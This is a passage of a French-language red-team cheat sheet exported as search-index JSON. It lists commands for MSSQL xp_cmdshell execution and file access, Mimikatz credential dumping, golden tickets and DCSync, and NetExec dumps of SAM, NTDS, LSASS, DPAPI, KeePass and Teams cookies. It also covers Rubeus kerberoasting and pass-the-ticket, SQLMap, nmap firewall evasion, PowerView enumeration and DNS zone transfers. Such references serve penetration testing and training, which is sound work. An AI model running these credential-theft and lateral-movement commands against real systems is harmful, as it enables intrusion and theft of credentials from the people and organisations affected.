http://phozagora.free.fr/</p>"},{"location":"Osint/Tools%20online/Personnes/","title":"Personnes","text":""},{"location":"Osint/Tools%20online/Personnes/#mails","title":"Mails","text":"<p>Epieos : https://epieos.com/</p>"},{"location":"Osint/Tools%20online/Personnes/#photos","title":"Photos","text":"<p>Pimeyes : https://pimeyes.com/en</p>"},{"location":"Osint/Tools%20online/Personnes/#pseudo","title":"Pseudo","text":"<p>namechk : https://namechk.com/</p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MSSQL/","title":"MSSQL","text":"<p>Connexion (depuis un poste windows):</p> <pre><code>sqlcmd -S $serveur$ -U $user -P $password\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MSSQL/#requetes-de-base","title":"Requ\u00eates de base","text":"<p>Lister les bases de donn\u00e9es:</p> <pre><code>SELECT name FROM master.sys.databases;\n</code></pre> <p>S\u00e9lectionner une base de donn\u00e9es:</p> <pre><code>USE &lt;nom_base_de_donn\u00e9es&gt;;\n</code></pre> <p>Lister les tables:</p> <pre><code>SELECT * FROM information_schema.tables;\n</code></pre> <p>Lister les serveurs li\u00e9s:</p> <pre><code>EXEC sp_linkedservers\nSELECT * FROM sys.servers;\n</code></pre> <p>Lister les utilisateurs: </p> <pre><code>select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MSSQL/#activer-xp_cmdshell","title":"Activer xp_cmdshell","text":"<pre><code>sp_configure 'show advanced options', '1'\nRECONFIGURE\nsp_configure 'xp_cmdshell', '1'\nRECONFIGURE\n</code></pre> <p>Ex\u00e9cuter une commande:</p> <pre><code>EXEC master..xp_cmdshell 'whoami'\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MSSQL/#lire-ecrire-un-fichier","title":"Lire / Ecrire un fichier","text":"<p>Voir si nous avons la permission de lire un fichier:</p> <pre><code>SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';\n</code></pre> <p>Lire un fichier:</p> <pre><code>SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n</code></pre> <p>Ecrire un fichier (demande normalement le droit administrateur):</p> <pre><code>sp_configure 'show advanced options', 1\nRECONFIGURE\nsp_configure 'Ole Automation Procedures', 1\nRECONFIGURE\nDECLARE @OLE INT\nDECLARE @FileID INT\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\fichier.txt', 8, 1\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, 'Coucou :)'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Base%20de%20donn%C3%A9es/MySQL/","title":"MySQL","text":"<p>Cr\u00e9er une base de donn\u00e9es:</p> <pre><code>CREATE DATABASE nomDB;\n</code></pre> <p>Lister les databases:</p> <pre><code>SHOW DATABASES;\n</code></pre> <p>Se d\u00e9placer dans une database:</p> <pre><code>USE nomDB;\n</code></pre> <p>Cr\u00e9er une table dans une database:</p> <pre><code>CREATE TABLE logins (\n    id INT,\n    username VARCHAR(100),\n    password VARCHAR(100),\n    date_of_joining DATETIME\n    );\n</code></pre> <p>Lister les tables d'une database:</p> <pre><code>SHOW TABLES;\n</code></pre> <p>Connaitre la structure d'une table:</p> <pre><code>DESCRIBE $nomTable;\n</code></pre> <p>Cr\u00e9er un nouvel enregistrement dans une table:</p> <pre><code>INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);\n</code></pre> <p>Cr\u00e9er un nouvel enregistrement dans une table, mais uniquement dans certaine colonnes (ce qui laissera la valeur des autres colonnes par d\u00e9faut):</p> <pre><code>INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);\n</code></pre> <p>Cr\u00e9er plusieurs enregistrements dans une table, uniquement dans certaines colonnes:</p> <pre><code>INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');\n</code></pre> <p>Lister tout les enregistrements d'une table:</p> <pre><code>SELECT * FROM $nomTable;\n</code></pre> <p>Lister tout les enregistrements d'une table, mais montrer uniquement certaines colonnes:</p> <pre><code>SELECT column1, column2 FROM table_name;\n</code></pre> <p>Ins\u00e9rer une nouvelle colonne (ici de type INT):</p> <pre><code>ALTER TABLE $nomTable ADD $nomColonne INT;\n</code></pre> <p>Renommer une colonne:</p> <pre><code>ALTER TABLE $nomTable RENAME COLUMN $nouveauNom TO $ancienNom;\n</code></pre> <p>Modifier le type d'une colonne (ici convertie en DATE):</p> <pre><code>ALTER TABLE $nomTable MODIFY $nomColonne DATE;\n</code></pre> <p>Effacer une colonne:</p> <pre><code>ALTER TABLE $nomTable DROP $nomColonne;\n</code></pre> <p>Changer la valeur de l'enregistrement d'une colonne. Ici on modifie la valeur \"password\" de tout les enregistrement de la table dont l'id est sup\u00e9rieur \u00e0 1:</p> <pre><code>UPDATE logins SET password = 'change_password' WHERE id &gt; 1;\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Mimikatz/","title":"Mimikatz","text":""},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Mimikatz/#sekurlsa","title":"SekurLSA","text":"<p>Credentials Manager : <pre><code>sekurlsa::credman\n</code></pre></p> <p>Kerberos encryption keys: <pre><code>sekurlsa::ekeys\n</code></pre></p> <p>Credentials kerberos pour les utilisateurs loggu\u00e9s: <pre><code>sekurlsa::kerberos\n</code></pre></p> <p>krbtgt: <pre><code>sekurlsa::krbtgt\n</code></pre></p> <p>Credentials SSP: <pre><code>sekurlsa::ssp\n</code></pre></p> <p>Credentials Wdigest: <pre><code>sekurlsa::wdigest\n</code></pre></p> <p>Logonpasswords: <pre><code>sekurlsa::logonpasswords\n</code></pre></p> <p>Switcher sur contexte minidump: <pre><code>sekurlsa::minidump\n</code></pre></p> <p>Pass the hash: <pre><code>sekurlsa::pth /user /domain /ntlm #/rc4 /run\n</code></pre></p> <p>Lister les tickets kerberos: <pre><code>sekurlsa::tickets #/export\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Mimikatz/#kerberos","title":"Kerberos","text":"<p>Golden ticket: <pre><code>kerberos::golden /domain /sid /sids /user /krbtgt /aes128 #/groups /ticket /id /aes256\n</code></pre></p> <p>[!Arguments] sid : SID du domaine sids : SID du groupe user : utilisateur cible groups : RID du groupe dont l'utilisateur est membre krbtgt : password NTLM du compte krbtgt ticket : chemin pour enregistrer le ticket au format .kirbi id : RID de l'utilisateur cible aes128 / aes256 : cl\u00e9 domain : domaine</p> <p>Lister les tickets kerberos en m\u00e9moire : <pre><code>kerberos::list\n</code></pre></p> <p>Pass the ticket: <pre><code>kerberos::ptt /filename:C:\\tiket.kirbi\n</code></pre></p> <p>Dump du TGT de l'utilisateur actuel: <pre><code>kerberos::tgt\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Mimikatz/#lsadump","title":"LSADUMP","text":"<p>DCShadow :</p> <pre><code>lsadump::dcshadow\n</code></pre> <p>DCSync:</p> <pre><code>lsadump::dcsync /all #/user /domain /csv /dc\n</code></pre> <p>LSA:</p> <pre><code>lsadump::lsa /inject\n</code></pre> <p>Trust key:</p> <pre><code>lsadump::trust /patch\n</code></pre> <p>SAM:</p> <pre><code>lsadump::sam\n</code></pre> <p>Secrets:</p> <pre><code>lsadump::secrets\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Mimikatz/#sid","title":"SID","text":"<p>Ajouter un SID au SIDHistory d'un objet:</p> <pre><code>sid::add /sam:$user /new:$newSID\n</code></pre> <p>Modifier le SID d'un objet:</p> <pre><code>sid:modify /sam:$user /new:$newSID\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Mimikatz/#token","title":"Token","text":"<p>Tenter une \u00e9l\u00e9vation de privil\u00e8ges via un token:</p> <pre><code>token::elevate\ntoken::elevate /domain\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/","title":"NetExec","text":""},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#smb","title":"SMB","text":"<p>Usage de base :</p> <pre><code>netexec smb $ip -u \"\" -p \"\"\n</code></pre> <p>Usage de base, en auth local:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --local-auth\n</code></pre> <p>Usage de base, avec un ticket en .ccache :</p> <pre><code>export KRB5CCNAME=/fichier/truc.ccache\n\nnetexec smb $ip --use-kcache\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#enumeration","title":"Enum\u00e9ration","text":"<p>Check pour vuln\u00e9rabilit\u00e9s sur le DC (petitpotam, zerologon et NoPac) :</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M Petitpotam\n\nnetexec smb $ip -u \"\" -p \"\" -M NoPac\n\nnetexec smb $ip -u \"\" -p \"\" -M zerologon\n</code></pre> <p>Enum\u00e9ration des hosts pr\u00e9sents sur le r\u00e9seau:</p> <pre><code>netexec smb 192.168.0.0/24\n</code></pre> <p>Enum\u00e9ration des utilisateurs sur un host ou sur le DC:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --users\n</code></pre> <p>Enum\u00e9ration des partages samba:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --shares\n</code></pre> <p>Enum\u00e9ration des groupes:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --groups\n</code></pre> <p>Enum\u00e9ration des DD:</p> <pre><code>netexec -u \"\" -p \"\" --disks\n</code></pre> <p>Enum\u00e9ration des utilisateurs loggu\u00e9s:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --loggedon-users\n</code></pre> <p>Enum\u00e9ration de la politique de mot de passe:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --pass-pol\n</code></pre> <p>Voir si un service \"spooler\" est actif:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M spooler\n</code></pre> <p>Voir si un service \"webdav\" est actif:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M webdav\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#execution-de-commandes","title":"Ex\u00e9cution de commandes","text":"<p>Ex\u00e9cuter une commande via wmi/at/smb:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -x whoami\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#partages-samba","title":"Partages samba","text":"<p>Spidering des partages:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --spider\nnetexec smb $ip -u \"\" -p \"\" -M spider_plus\n</code></pre> <p>Dump de tout les fichiers:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M spider_plus -o READ_ONLY=false\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#uploaddownload-de-fichiers","title":"Upload/Download de fichiers","text":"<p>Download d'un fichier:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --get-file \\\\Windows\\\\Temps\\\\test.txt /dossier/local/test.txt\n</code></pre> <p>Upload d'un fichier:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --put-file \\\\Windows\\\\Temps\\\\test.txt /dossier/local/test.txt\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#dump","title":"Dump","text":"<p>SAM:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --sam\n</code></pre> <p>NTDS:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --ntds\n</code></pre> <p>LSA:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --lsa\n</code></pre> <p>LSASS:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M lsassy\n</code></pre> <p>Password Wifi:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M wireless\n</code></pre> <p>Keepass:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M keepass_discover\nnetexec smb $ip -u \"\" -p \"\" -M keepass_trigger -o KEEPASS_CONFIG_PATH=\"path_from_module_discovery\"\n</code></pre> <p>DPAPI:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" --dpapi\n</code></pre> <p>Cookie Teams:</p> <pre><code>netexec smb $ip -u \"\" -p \"\" -M teams_localdb\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#ldap","title":"LDAP","text":"<p>Asreproasting:</p> <pre><code>netexec ldap $ip -u \"\" -p \"\" --asreproast output.txt\n</code></pre> <p>Kerberoasting:</p> <pre><code>netexec ldap $ip -u \"\" -p \"\" --kerberoasting output.txt\n</code></pre> <p>Unconstrained delegation:</p> <pre><code>netexec ldap $ip -u \"\" -p \"\" --trusted-to-delegate\n</code></pre> <p>Quota de compte machine:</p> <pre><code>netexec ldap $ip -u \"\" -p \"\" -M maq\n</code></pre> <p>Description utilisateur:</p> <pre><code>netexec ldap $ip -u \"\" -p \"\" -M users_desc\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#rdp","title":"RDP","text":"<p>Screenshot:</p> <pre><code>netexec rdp &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --screenshot --screentime &lt;second&gt;\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#winrm","title":"WINRM","text":"<p>Ex\u00e9cution de commande:</p> <pre><code>netexec winrm 192.168.255.131 -u user -p 'password' -X whoami\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/NetExec/#mssql","title":"MSSQL","text":"<p>Privesc:</p> <pre><code>netexec mssql &lt;ip&gt; -u user -p password -M mssql_priv\n</code></pre> <p>Commandes MSSQL:</p> <pre><code>netexec mssql 10.10.10.52 -u admin -p 'password' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'\n</code></pre> <p>Commandes via xp_cmdshell:</p> <pre><code>netexec mssql 10.10.10.59 -u sa -p 'password' --local-auth -x whoami\n</code></pre> <p>Upload d'un fichier:</p> <pre><code>netexec mssql 192.168.212.134 -u admin -p password --put-file /tmp/users C:\\\\Windows\\\\Temp\\\\whoami.txt\n</code></pre> <p>Download d'un fichier:</p> <pre><code>netexec mssql 10.10.10.52 -u admin -p 'password' --get-file C:\\\\Windows\\\\Temp\\\\whoami.txt /tmp/file\n</code></pre>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/","title":"Nmap","text":"<p>Base: <pre><code>nmap [adresse_ip_ou_plage]\n</code></pre></p> <p>Scan rapide: <pre><code>nmap -T4 -F [adresse_ip_ou_plage]\n</code></pre></p> <p>D\u00e9tecter les syst\u00e8mes d'exploitation et les services: <pre><code>nmap -A [adresse_ip_ou_plage]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/#balayage-de-ports-specifiques","title":"Balayage de Ports Sp\u00e9cifiques","text":"<p>Scan d'un seul port: <pre><code>nmap -p [port] [adresse_ip]\n</code></pre></p> <p>Scan de plusieurs ports sp\u00e9cifiques: <pre><code>nmap -p [port1],[port2],... [adresse_ip]\n</code></pre></p> <p>Scan d'une plage de ports: <pre><code>nmap -p [port_debut]-[port_fin] [adresse_ip]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/#balayages-avances","title":"Balayages Avanc\u00e9s","text":"<p>Scan SYN (Half-open): <pre><code>nmap -sS [adresse_ip_ou_plage]\n</code></pre></p> <p>Scan UDP: <pre><code>nmap -sU [adresse_ip_ou_plage]\n</code></pre></p> <p>Scan de tous les ports (TCP): <pre><code>nmap -p- [adresse_ip]\n</code></pre></p> <p>Scan sans r\u00e9solution DNS: <pre><code>nmap -n [adresse_ip_ou_plage]\n</code></pre></p> <p>Scan agressif: <pre><code>nmap -A -T4 [adresse_ip_ou_plage]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/#decouverte-dhotes","title":"D\u00e9couverte d'h\u00f4tes","text":"<p>Ping Scan (ne scanne pas les ports): <pre><code>nmap -sn [adresse_ip_ou_plage]\n</code></pre></p> <p>D\u00e9couverte de H\u00f4tes sur un r\u00e9seau: <pre><code>nmap -sP [plage_reseau]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/#techniques-de-contournement-de-firewall","title":"Techniques de Contournement de Firewall","text":"<p>Fragmentation des paquets: <pre><code>nmap -f [adresse_ip_ou_plage]\n</code></pre></p> <p>Scan avec un port source sp\u00e9cifique: <pre><code>nmap --source-port [port] [adresse_ip_ou_plage]\n</code></pre></p> <p>Scan avec d\u00e9calage de d\u00e9tection de version: <pre><code>nmap -sV --version-intensity 0 [adresse_ip_ou_plage]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/#scripts-nmap-et-detection-de-vulnerabilites","title":"Scripts Nmap et D\u00e9tection de Vuln\u00e9rabilit\u00e9s","text":"<p>Utilisation des scripts Nmap: <pre><code>nmap --script=[nom_script] [adresse_ip_ou_plage]\n</code></pre></p> <p>D\u00e9tection de vuln\u00e9rabilit\u00e9s: <pre><code>nmap --script=vuln [adresse_ip_ou_plage]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Nmap/#options-diverses","title":"Options Diverses","text":"<p>Sp\u00e9cifier le d\u00e9lai entre les paquets: <pre><code>nmap --max-rate [packets_per_second] [adresse_ip_ou_plage]\n</code></pre></p> <p>D\u00e9finir un d\u00e9lai d'expiration: <pre><code>nmap --host-timeout [temps] [adresse_ip_ou_plage]\n</code></pre></p> <p>Sauvegarder la sortie dans un fichier: <pre><code>nmap -oN [nom_fichier] [adresse_ip_ou_plage]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/","title":"PowerView","text":"<p>Trouver des informations sur le domaine actuel: <pre><code>Get-NetDomain\n</code></pre></p> <p>Trouver des informations sur un domaine sp\u00e9cifique: <pre><code>Get-NetDomain -Domain [nom_domaine]\n</code></pre></p> <p>Trouver un contr\u00f4leur de domaine: <pre><code>Get-NetDomainController\n</code></pre></p> <p>Trouver des informations sur un utilisateur: <pre><code>Get-NetUser -Username [nom_utilisateur]\n</code></pre></p> <p>Lister tous les utilisateurs: <pre><code>Get-NetUser | select cn\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/#travail-avec-les-groupes","title":"Travail avec les Groupes","text":"<p>Trouver des informations sur un groupe: <pre><code>Get-NetGroup -GroupName [nom_groupe]\n</code></pre></p> <p>Lister tous les groupes: <pre><code>Get-NetGroup -FullData\n</code></pre></p> <p>Trouver des membres d'un groupe: <pre><code>Get-NetGroupMember -GroupName [nom_groupe]\n</code></pre></p> <p>Trouver des groupes auxquels un utilisateur appartient: <pre><code>Get-NetGroup -Username [nom_utilisateur]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/#exploration-des-ordinateurs","title":"Exploration des Ordinateurs","text":"<p>Lister les ordinateurs du domaine: <pre><code>Get-NetComputer\n</code></pre></p> <p>Trouver des informations d\u00e9taill\u00e9es sur un ordinateur: <pre><code>Get-NetComputer -ComputerName [nom_ordi] -FullData\n</code></pre></p> <p>Trouver des ordinateurs avec un syst\u00e8me d'exploitation sp\u00e9cifique: <pre><code>Get-NetComputer -OperatingSystem \"*Server*\"\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/#travail-avec-les-sessions-et-les-connexions","title":"Travail avec les Sessions et les Connexions","text":"<p>Trouver les sessions actives sur un ordinateur: <pre><code>Get-NetSession -ComputerName [nom_ordi]\n</code></pre></p> <p>Trouver les connexions ouvertes vers des ressources partag\u00e9es: <pre><code>Get-NetLoggedon -ComputerName [nom_ordi]\n</code></pre></p> <p>Trouver des machines o\u00f9 un utilisateur est connect\u00e9: <pre><code>Find-LocalAdminAccess -ComputerName [nom_ordi]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/#gestion-des-politiques-de-groupe","title":"Gestion des Politiques de Groupe","text":"<p>Trouver des GPO appliqu\u00e9es \u00e0 un utilisateur ou un ordinateur: <pre><code>Get-NetGPO -ComputerName [nom_ordi]\n</code></pre></p> <p>Trouver des GPO qui d\u00e9finissent des droits utilisateur/administrateur: <pre><code>Get-NetGPOGroup\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/#recherche-de-relations-de-confiance","title":"Recherche de Relations de Confiance","text":"<p>Trouver des relations de confiance du domaine: <pre><code>Get-NetDomainTrust\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/PowerView/#divers","title":"Divers","text":"<p>Trouver des objets Active Directory: <pre><code>Find-ADObject -SearchBase \"LDAP://OU=Users,DC=domaine,DC=com\"\n</code></pre></p> <p>Trouver des objets int\u00e9ressants (comme les partages, les machines non patch\u00e9es): <pre><code>Invoke-ShareFinder -CheckShareAccess\n</code></pre></p> <p>\u00c9num\u00e9rer les ACLs d'un objet: <pre><code>Get-ObjectAcl -SamAccountName [nom_objet] -ResolveGUIDs\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/Rubeus/","title":"Rubeus","text":"<p>Dump des tickets: <pre><code>Rubeus.exe dump\n</code></pre></p> <p>Demander un TGT: <pre><code>Rubeus.exe asktgt /user: /password: /domain:\n</code></pre></p> <p>Demander un TGS: <pre><code>Rubeus.exe asktgs /ticket: /service:\n</code></pre></p> <p>[!Argument] /ticket : tgt en base64</p> <p>Kerberoasting: <pre><code>Rubeus.exe kerberoast\n</code></pre></p> <p>Pass the ticket: <pre><code>Rubeus.exe ptt /ticket:\n</code></pre></p> <p>[!Argument] /ticket : tgt en base64</p> <p>Renouveler un tgt: <pre><code>Rubeus.exe renew /ticket:\n</code></pre></p> <p>[!Argument] /ticket : tgt en base64</p> <p>Monitorer les changements dans les tickets kerberos sur la machine actuelle: <pre><code>Rubeus.exe monitor\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Tools/SQLMap/","title":"SQLMap","text":"<p>Commande de base (Get): <pre><code>sqlmap -u http://domain.com/truc?oups=1\n</code></pre></p> <p>Commande de base (Post): <pre><code>sqlmap -u http://domain.com/truc --data \"user=oups&amp;pass=oulah\"\n</code></pre></p> <p>Depuis une requ\u00eate Burp: <pre><code>sqlmap -r req.txt\n</code></pre></p> <p>Augmenter le risque/level des tentatives (tentes plus de choses, mais est plus bruyant): <pre><code>sqlmap -r req.txt --level 5 --risk 3\n</code></pre></p> <p>D\u00e9finir un suffixe: <pre><code>sqlmap -r req.txt --suffix=\"-- \"\n</code></pre></p> <p>D\u00e9finir un pr\u00e9fixe: <pre><code>sqlmap -r req.txt --prefix=\"') \"\n</code></pre></p> <p>D\u00e9finir un cookie: <pre><code>sqlmap --cookie=\"lecookie\"\n</code></pre></p> <p>Flush de notre session: <pre><code>sqlmap --flush-session\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Windows/Net/","title":"Net","text":""},{"location":"Red%20Team/1%20-%20Cheatsheet/Windows/Net/#gestion-des-utilisateurs-et-des-groupes","title":"Gestion des utilisateurs et des groupes","text":"<p>Ajouter un utilisateur: <pre><code>net user [nom_utilisateur] [mot_de_passe] /add`\n</code></pre></p> <p>Supprimer un utilisateur: <pre><code>net user [nom_utilisateur] /delete`\n</code></pre></p> <p>Lister tous les utilisateurs: <pre><code>net user\n</code></pre></p> <p>Changer le mot de passe d'un utilisateur: <pre><code>net user [nom_utilisateur] *\n</code></pre></p> <p>Ajouter un utilisateur \u00e0 un groupe: <pre><code>net localgroup [nom_groupe] [nom_utilisateur] /add\n</code></pre></p> <p>Lister les membres d'un groupe: <pre><code>net localgroup [nom_groupe]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Windows/Net/#gestion-des-partages-de-fichiers-et-dossiers","title":"Gestion des partages de fichiers et dossiers","text":"<p>Lister les ressources partag\u00e9es: <pre><code>net share\n</code></pre></p> <p>Cr\u00e9er un partage: <pre><code>net share [nom_partage]=[chemin_dossier]\n</code></pre></p> <p>Supprimer un partage: <pre><code>net share [nom_partage] /delete\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Windows/Net/#gestion-des-services","title":"Gestion des services","text":"<p>Lister tous les services: <pre><code>net start\n</code></pre></p> <p>D\u00e9marrer un service: <pre><code>net start [nom_service]\n</code></pre></p> <p>Arr\u00eater un service: <pre><code>net stop [nom_service]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Windows/Net/#gestion-du-reseau","title":"Gestion du r\u00e9seau","text":"<p>Voir la configuration r\u00e9seau: <pre><code>net config [serveur|workstation]\n</code></pre></p> <p>Voir les statistiques r\u00e9seau: <pre><code>net statistics [serveur|workstation]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Windows/Net/#autres-commandes-utiles","title":"Autres commandes utiles","text":"<p>Voir les sessions actives: <pre><code>net session\n</code></pre></p> <p>Voir les connexions actuelles: <pre><code>net use\n</code></pre></p> <p>Connecter un lecteur r\u00e9seau: <pre><code>net use [lettre_lecteur:] \\\\[nom_serveur]\\[partage] [mot_de_passe] /user:[nom_utilisateur]\n</code></pre></p> <p>D\u00e9connecter un lecteur r\u00e9seau: <pre><code>net use [lettre_lecteur:] /delete\n</code></pre></p> <p>Envoyer un message \u00e0 un utilisateur ou une machine: <pre><code>net send [nom_machine] [message]\n</code></pre></p>"},{"location":"Red%20Team/1%20-%20Cheatsheet/Windows/RPC/","title":"RPC","text":"<p>Connexion via RPC:</p> <pre><code>rpc -U $users $ip\n</code></pre> <p>Infos serveur:</p> <pre><code>srvinfo\n</code></pre> <p>Lister les utilisateurs:</p> <pre><code>enumdomusers\n</code></pre> <p>Information sur un utilisateur:</p> <pre><code>queryuser &lt;0xrid&gt;\n</code></pre> <p>Lister les groupes de l'utilisateur:</p> <pre><code>queryusergroups &lt;0xrid&gt;\n</code></pre> <p>Lister les groupes:</p> <pre><code>enumdomgroups\n</code></pre> <p>Lister les domaines:</p> <pre><code>enumdomains\n</code></pre> <p>Informations sur un domaine:</p> <pre><code>querydominfo\n</code></pre> <p>Lister les partages:</p> <pre><code>netshareenumall\n</code></pre> <p>Information sur un partage:</p> <pre><code>netsharegetinfo &lt;share&gt;\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>Domain Name System, port 53, TCP/UDP R\u00e9solution des noms de domaines.</p> DNS Record Description A Adresse IPv4 du domaine. AAAA Adresse IPv6 du domaine. MX Serveur Mail du domaine. NS Serveur DNS du domaine. TXT Champs texte, peut contenir tout un tas d'informations. CNAME Alias: domaine secondaire qui pointera au m\u00eame endroit que le domaine principal. PTR Convertit un domaine en adresse IP (sens inverse, donc). SOA Contient des informations sur la zone DNS."},{"location":"Red%20Team/2%20-%20Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enum\u00e9ration","text":"<p>Savoir quels autres serveurs DNS sont pr\u00e9sents:</p> <pre><code>dig ns $domain @$ip\n</code></pre> <p>Zone Transfer (Permet \u00e0 un serveur DNS de transf\u00e9rer sa zone \u00e0 un autre serveur DNS en cas de probl\u00e8me. En cas de mauvaise configuration il est possible pour nous aussi de faire une demande de transfert et de r\u00e9cup\u00e9rer les information.):</p> <pre><code>dig axfr $domain @$ip\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#brute-force","title":"Brute force","text":"<p>Brute-force des subdomains:</p> <pre><code>dnsenum --dnsserver $ip --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt $domain\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#metasploit","title":"Metasploit","text":"<pre><code>auxiliary/gather/enum_dns\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/DNS/G%C3%A9n%C3%A9ralit%C3%A9s/#p-configuration-potentiellement-dangereuse","title":"P# Configuration potentiellement dangereuse","text":"Option Description allow-query Defines which hosts are allowed to send requests to the DNS server. allow-recursion Defines which hosts are allowed to send recursive requests to the DNS server. allow-transfer Defines which hosts are allowed to receive zone transfers from the DNS server. zone-statistics Collects statistical data of zones."},{"location":"Red%20Team/2%20-%20Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"<p>File Transfer Protocol, port 21, TCP Transfert de fichier, non s\u00e9curis\u00e9 contrairement \u00e0 ses diff\u00e9rentes variantes (sFTP, etc), les donn\u00e9es sont transmises en clair.</p>"},{"location":"Red%20Team/2%20-%20Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#enumeration","title":"Enumeration","text":"<p>Nmap:</p> <pre><code>nmap -A --script ftp* -p 21 $ip\n</code></pre> <p>connection via netcat 